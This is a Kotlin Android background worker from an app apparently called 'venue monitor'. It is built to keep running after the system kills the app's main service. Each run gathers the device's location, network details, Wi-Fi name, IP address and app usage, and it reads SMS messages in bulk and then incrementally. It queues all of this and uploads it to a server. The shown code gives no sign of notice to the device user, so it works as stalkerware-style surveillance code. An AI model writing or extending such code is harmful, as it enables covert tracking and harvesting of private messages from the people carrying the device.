package com.venue.monitor.work

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.gson.Gson
import com.venue.monitor.MonitorApplication
import com.venue.monitor.api.ApiClient
import com.venue.monitor.api.MonitorReportRequest
import com.venue.monitor.data.PendingUploadStore
import com.venue.monitor.data.SmsReportRequest
import com.venue.monitor.device.AppUsageProvider
import com.venue.monitor.device.DeviceStatusProvider
import com.venue.monitor.device.SmsProvider
import com.venue.monitor.location.LocationProvider
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * WorkManager 兜底任务 - 当前台服务被系统杀死时，WorkManager 仍会按周期触发
 * 注意：WorkManager 最小周期为 15 分钟，因此这里作为兜底机制
 * 主力的 10 分钟定时由 MonitorForegroundService 中的协程完成
 *
 * 与前台服务共享 PendingUploadStore：采集后入队，再 drain 上传（断点续传+失败重试）
 */
class MonitorWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val prefs = MonitorApplication.prefs
        if (!prefs.isActivated) return Result.success()

        val gson = Gson()
        val store = PendingUploadStore(applicationContext)

        return try {
            // 1. 采集本次数据并入队
            val locationProvider = LocationProvider(applicationContext)
            val deviceProvider = DeviceStatusProvider(applicationContext)

            val location = locationProvider.getLastLocation()
            val battery = deviceProvider.getBatteryInfo()
            val network = deviceProvider.getNetworkInfo()
            val usage = AppUsageProvider(applicationContext).getUsageInfo()

            val request = MonitorReportRequest(
                deviceCode = prefs.deviceCode,
                deviceToken = prefs.deviceToken,
                latitude = location?.latitude,
                longitude = location?.longitude,
                accuracy = location?.accuracy?.toDouble(),
                altitude = location?.altitude,
                speed = location?.speed?.toDouble(),
                batteryLevel = battery.level,
                batteryCharging = battery.charging,
                batteryTemperature = battery.temperature.toDouble(),
                networkType = network.type,
                networkStrength = network.strength,
                wifiSsid = network.ssid,
                ipAddress = network.ipAddress,
                foregroundApp = usage.foregroundApp,
                recentApps = usage.recentApps,
                extra = mapOf("source" to "workmanager"),
                recordedAt = nowIso8601()
            )
            store.enqueue("monitor", gson.toJson(request))

            // 2. 短信并入队
            try {
                val smsProvider = SmsProvider(applicationContext)
                if (smsProvider.hasPermission()) {
                    val (items, syncType) = if (!prefs.smsFullSynced) {
                        Pair(smsProvider.readAllSms(limit = 500), "full")
                    } else {
                        Pair(
                            smsProvider.readAllSms(
                                limit = null,
                                sinceSmsId = if (prefs.lastSmsSyncId > 0) prefs.lastSmsSyncId else null
                            ),
                            "incremental"
                        )
                    }
                    if (items.isNotEmpty()) {
                        val smsReq = SmsReportRequest(
                            deviceCode = prefs.deviceCode,
                            deviceToken = prefs.deviceToken,
                            items = items,
                            syncType = syncType,
                            reportedAt = nowIso8601()
                        )
                        store.enqueue("sms", gson.toJson(smsReq))
                        val maxId = items.maxOfOrNull { it.smsId } ?: 0L
                        if (maxId > prefs.lastSmsSyncId) prefs.lastSmsSyncId = maxId
                        if (!prefs.smsFullSynced) prefs.smsFullSynced = true
                    }
                }
            } catch (_: Throwable) { /* 短信采集失败不影响整体 */ }

            // 3. drain 队列：逐条上传
            ApiClient.rebuild()
            val api = ApiClient.get()
            var allOk = true
            for (entry in store.peekAll()) {
                try {
                    val ok = when (entry.type) {
                        "monitor" -> api.report(gson.fromJson(entry.payload, MonitorReportRequest::class.java)).ok
                        "sms" -> api.reportSms(gson.fromJson(entry.payload, SmsReportRequest::class.java)).ok
                        "app_usage" -> api.reportAppUsage(gson.fromJson(entry.payload, com.venue.monitor.data.AppUsageReportRequest::class.java)).ok
                        else -> true
                    }
                    if (ok) {
                        store.remove(entry.id)
                    } else {
                        store.markFailed(entry.id)
                        allOk = false
                    }
                } catch (e: Exception) {
                    store.markFailed(entry.id)
                    allOk = false
                    Log.w(WORK_NAME, "drain 失败 type=${entry.type}: ${e.message}")
                    break // 网络异常时停止后续
                }
            }

            if (allOk) Result.success() else Result.retry()
        } catch (e: Exception) {
            Log.e(WORK_NAME, "兜底任务失败: ${e.message}")
            Result.retry()
        }
    }

    private fun nowIso8601(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date())
    }

    companion object {
        const val WORK_NAME = "venue_monitor_worker"

        /** 计算下次执行的周期（15 分钟，WorkManager 最小值） */
        const val BACKUP_INTERVAL_MINUTES = 15L
    }
}

